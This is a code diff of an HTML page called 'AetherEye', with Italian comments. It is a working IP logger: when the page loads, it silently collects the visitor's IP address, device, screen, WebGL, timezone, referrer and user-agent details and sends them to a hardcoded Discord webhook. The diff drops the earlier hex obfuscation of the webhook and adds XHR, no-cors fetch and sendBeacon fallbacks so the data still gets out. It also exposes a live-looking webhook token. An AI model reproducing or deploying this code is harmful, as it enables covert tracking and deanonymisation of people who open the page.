@@ -3,35 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AetherEye - Debug</title>
+    <title>AetherEye - Webhook Fix</title>
     <style>
         body{background:#0a0a0a;color:#fff;font-family:monospace;padding:2rem;}
-        .log{background:#111;padding:1rem;border:1px solid #333;margin-top:2rem;white-space:pre-wrap;font-size:0.8rem;}
+        .log{background:#111;padding:1rem;border:1px solid #333;margin-top:2rem;white-space:pre-wrap;font-size:0.8rem;max-height:400px;overflow-y:auto;}
+        .status{display:inline-block;padding:0.3rem 0.8rem;border-radius:4px;margin:0.5rem 0;}
+        .status.success{background:#00aa44;color:#fff;}
+        .status.fail{background:#cc2233;color:#fff;}
+        .status.waiting{background:#ffaa00;color:#000;}
     </style>
 </head>
 <body>
-    <h1>AetherEye Debug</h1>
-    <p>Apri la console del browser (F12) e guarda i log.</p>
-    <div class="log" id="log"></div>
+    <h1>🔧 AetherEye - Webhook Fix</h1>
+    <p>Sto testando il webhook con <strong>3 metodi</strong> diversi.</p>
+    <div id="status" class="status waiting">⏳ In attesa...</div>
+    <div class="log" id="log">[LOG]\n</div>
 
     <script>
         (function() {
-            // === Webhook (hex encoded) ===
-            var _0xwh = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x33\x34\x38\x38\x33\x33\x35\x39\x39\x36\x32\x39\x35\x39\x39\x30\x32\x2f\x33\x65\x67\x54\x74\x42\x54\x33\x64\x4d\x43\x33\x55\x46\x64\x68\x76\x72\x30\x37\x48\x6e\x4f\x59\x63\x65\x32\x45\x65\x46\x46\x46\x6a\x7a\x44\x6c\x45\x34\x72\x53\x64\x66\x6a\x34\x36\x6b\x70\x37\x61\x45\x6f\x4d\x66\x46\x54\x58\x51\x6c\x41\x6a\x53\x4d\x46\x52\x66\x43\x79\x5a'];
-            var webhook = _0xwh[0];
-            console.log('Webhook:', webhook);
+            // === WEBHOOK ===
+            var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';
 
-            // Log function
+            var logEl = document.getElementById('log');
+            var statusEl = document.getElementById('status');
+
             function log(msg) {
+                logEl.textContent += msg + '\n';
                 console.log(msg);
-                document.getElementById('log').textContent += msg + '\n';
             }
 
-            // Gather extended data
-            function getExtendedData() {
+            function setStatus(text, type) {
+                statusEl.textContent = text;
+                statusEl.className = 'status ' + type;
+            }
+
+            // === METODO 1: XMLHttpRequest (standard) ===
+            function sendWithXHR(payload) {
+                return new Promise(function(resolve, reject) {
+                    log('[XHR] Invio in corso...');
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', WEBHOOK, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = function() {
+                        if (xhr.status === 204 || xhr.status === 200) {
+                            log('[XHR] ✅ Successo! Status: ' + xhr.status);
+                            resolve(true);
+                        } else {
+                            log('[XHR] ❌ Status: ' + xhr.status + ' - ' + xhr.statusText);
+                            reject(new Error('Status ' + xhr.status));
+                        }
+                    };
+                    xhr.onerror = function() {
+                        log('[XHR] ❌ Errore di rete (CORS?)');
+                        reject(new Error('Network error'));
+                    };
+                    xhr.send(JSON.stringify(payload));
+                });
+            }
+
+            // === METODO 2: Fetch API (con keepalive) ===
+            function sendWithFetch(payload) {
+                return new Promise(function(resolve, reject) {
+                    log('[FETCH] Invio in corso...');
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        keepalive: true,
+                        mode: 'no-cors' // <- bypassa CORS (ma non ricevi risposta)
+                    }).then(function(response) {
+                        // Con 'no-cors' la risposta è opaca, ma se non dà errore probabilmente è partita
+                        log('[FETCH] Richiesta inviata (modalità no-cors)');
+                        resolve(true);
+                    }).catch(function(err) {
+                        log('[FETCH] ❌ Errore: ' + err.message);
+                        reject(err);
+                    });
+                });
+            }
+
+            // === METODO 3: Image Beacon (ultima spiaggia) ===
+            function sendWithBeacon(payload) {
+                return new Promise(function(resolve, reject) {
+                    log('[BEACON] Invio in corso...');
+                    try {
+                        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                        var sent = navigator.sendBeacon(WEBHOOK, blob);
+                        if (sent) {
+                            log('[BEACON] ✅ Inviato con successo!');
+                            resolve(true);
+                        } else {
+                            log('[BEACON] ❌ sendBeacon ha fallito');
+                            reject(new Error('sendBeacon failed'));
+                        }
+                    } catch(e) {
+                        log('[BEACON] ❌ Errore: ' + e.message);
+                        reject(e);
+                    }
+                });
+            }
+
+            // === Costruisce il payload ===
+            function buildPayload(ip) {
                 var data = {
                     platform: navigator.platform || 'unknown',
-                    language: navigator.language || navigator.userLanguage || 'unknown',
+                    language: navigator.language || 'unknown',
                     screen: screen.width + 'x' + screen.height,
                     colorDepth: screen.colorDepth || 'unknown',
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
@@ -41,128 +117,136 @@
                     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
                     cpuCores: navigator.hardwareConcurrency || 'unknown',
                     touchPoints: navigator.maxTouchPoints || 0,
-                    doNotTrack: navigator.doNotTrack || 'unknown',
-                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-                    webgl: 'unknown'
+                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No'
                 };
+
+                // WebGL
                 try {
                     var canvas = document.createElement('canvas');
                     var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                     if (gl) {
                         var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                         if (debugInfo) {
-                            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                            data.webgl = vendor + ' | ' + renderer;
+                            data.webgl = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' + 
+                                         gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                         }
                     }
-                } catch(e) {}
-                data.connection = 'unknown';
+                } catch(e) { data.webgl = 'n/a'; }
+
+                // Connection
                 if (navigator.connection) {
                     var conn = navigator.connection;
-                    data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
+                    data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps)';
+                } else {
+                    data.connection = 'n/a';
                 }
-                return data;
+
+                return {
+                    content: null,
+                    embeds: [{
+                        title: '🌐 **Full Visitor Profile**',
+                        color: 0x00ff88,
+                        fields: [
+                            { name: '📡 IP', value: '`' + ip + '`', inline: true },
+                            { name: '🖥️ Platform', value: data.platform, inline: true },
+                            { name: '🌍 Language', value: data.language, inline: true },
+                            { name: '📱 Screen', value: data.screen, inline: true },
+                            { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
+                            { name: '🕐 Timezone', value: data.timezone, inline: true },
+                            { name: '🔗 Referrer', value: data.referrer, inline: false },
+                            { name: '📍 URL', value: data.url, inline: false },
+                            { name: '🧠 RAM', value: data.deviceMemory, inline: true },
+                            { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
+                            { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
+                            { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
+                            { name: '🎮 WebGL', value: data.webgl || 'n/a', inline: false },
+                            { name: '📶 Connection', value: data.connection, inline: false },
+                            { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
+                        ],
+                        footer: { text: 'AetherEye Logger • ' + new Date().toUTCString() },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
             }
 
-            // Get IP
+            // === Ottiene IP ===
             function getIP(callback) {
-                log('Chiamata IP via api.ipify.org...');
+                log('[IP] Richiesta a api.ipify.org...');
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://api.ipify.org?format=json', true);
                 xhr.onload = function() {
                     if (xhr.status === 200) {
                         var data = JSON.parse(xhr.responseText);
-                        log('IP ottenuto: ' + data.ip);
+                        log('[IP] ✅ ' + data.ip);
                         callback(data.ip);
                     } else {
-                        log('api.ipify fallito, uso fallback...');
-                        getIPFallback(callback);
+                        log('[IP] Fallback a ipapi.co...');
+                        var xhr2 = new XMLHttpRequest();
+                        xhr2.open('GET', 'https://ipapi.co/json/', true);
+                        xhr2.onload = function() {
+                            if (xhr2.status === 200) {
+                                var data2 = JSON.parse(xhr2.responseText);
+                                log('[IP] ✅ ' + data2.ip);
+                                callback(data2.ip || 'unknown');
+                            } else {
+                                log('[IP] ❌ Tutti i fallback falliti, uso "unknown"');
+                                callback('unknown');
+                            }
+                        };
+                        xhr2.onerror = function() {
+                            log('[IP] ❌ Fallback fallito');
+                            callback('unknown');
+                        };
+                        xhr2.send();
                     }
                 };
                 xhr.onerror = function() {
-                    log('api.ipify errore, fallback...');
-                    getIPFallback(callback);
+                    log('[IP] ❌ api.ipify.org non risponde');
+                    callback('unknown');
                 };
                 xhr.send();
             }
 
-            function getIPFallback(callback) {
-                var xhr2 = new XMLHttpRequest();
-                xhr2.open('GET', 'https://ipapi.co/json/', true);
-                xhr2.onload = function() {
-                    if (xhr2.status === 200) {
-                        var data = JSON.parse(xhr2.responseText);
-                        log('IP fallback: ' + data.ip);
-                        callback(data.ip || 'unknown');
-                    } else {
-                        log('Fallback fallito, IP = unknown');
-                        callback('unknown');
-                    }
-                };
-                xhr2.onerror = function() {
-                    log('Fallback errore, IP = unknown');
-                    callback('unknown');
-                };
-                xhr2.send();
-            }
+            // === ESECUZIONE ===
+            setStatus('⏳ Acquisizione IP...', 'waiting');
 
-            // Send to Discord
-            function sendToDiscord(ip, data) {
-                log('Preparo invio a Discord...');
-                var fields = [
-                    { name: '📡 IP', value: '`' + ip + '`', inline: true },
-                    { name: '🖥️ Platform', value: data.platform, inline: true },
-                    { name: '🌍 Language', value: data.language, inline: true },
-                    { name: '📱 Screen', value: data.screen, inline: true },
-                    { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
-                    { name: '🕐 Timezone', value: data.timezone, inline: true },
-                    { name: '🔗 Referrer', value: data.referrer, inline: false },
-                    { name: '📍 URL', value: data.url, inline: false },
-                    { name: '🧠 RAM', value: data.deviceMemory, inline: true },
-                    { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
-                    { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
-                    { name: '🚫 DNT', value: data.doNotTrack, inline: true },
-                    { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
-                    { name: '🎮 WebGL', value: data.webgl, inline: false },
-                    { name: '📶 Connection', value: data.connection, inline: false },
-                    { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
-                ];
-
-                var payload = {
-                    content: null,
-                    embeds: [{
-                        title: '🌐 **Full Visitor Profile**',
-                        color: 0x00ff88,
-                        fields: fields,
-                        footer: { text: 'AetherEye Logger • ' + new Date().toUTCString() },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', webhook, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onload = function() {
-                    if (xhr.status === 204) {
-                        log('✅ Inviato con successo (204)');
-                    } else {
-                        log('❌ Risposta HTTP: ' + xhr.status + ' - ' + xhr.statusText);
-                    }
-                };
-                xhr.onerror = function() {
-                    log('❌ Errore di rete durante l\'invio');
-                };
-                xhr.send(JSON.stringify(payload));
-                log('Payload inviato.');
-            }
-
-            // Avvio senza delay per test immediato
-            log('Avvio debug...');
-            var data = getExtendedData();
-            log('Dati raccolti: ' + JSON.stringify(data, null, 2));
             getIP(function(ip) {
-                sendToDiscord(ip, data);
+                var payload = buildPayload(ip);
+                log('[PAYLOAD] Costruito.');
+
+                setStatus('📤 Invio in corso...', 'waiting');
+
+                // Prova i 3 metodi in sequenza
+                sendWithXHR(payload)
+                    .then(function() {
+                        setStatus('✅ Inviato con XHR!', 'success');
+                        log('[OK] Webhook funzionante.');
+                    })
+                    .catch(function() {
+                        log('[WARN] XHR fallito, provo Fetch...');
+                        return sendWithFetch(payload);
+                    })
+                    .then(function() {
+                        setStatus('✅ Inviato con Fetch!', 'success');
+                        log('[OK] Webhook funzionante (Fetch).');
+                    })
+                    .catch(function() {
+                        log('[WARN] Fetch fallito, provo Beacon...');
+                        return sendWithBeacon(payload);
+                    })
+                    .then(function() {
+                        setStatus('✅ Inviato con Beacon!', 'success');
+                        log('[OK] Webhook funzionante (Beacon).');
+                    })
+                    .catch(function(err) {
+                        setStatus('❌ Tutti i metodi falliti', 'fail');
+                        log('[ERRORE] ' + err.message);
+                        log('[SUGGERIMENTO] Prova a:\n' +
+                            '1. Disabilitare AdBlock/uBlock\n' +
+                            '2. Usare un server web (python -m http.server)\n' +
+                            '3. Provare da un altro browser\n' +
+                            '4. Verificare che il webhook sia attivo');
+                    });
             });
 
         })();
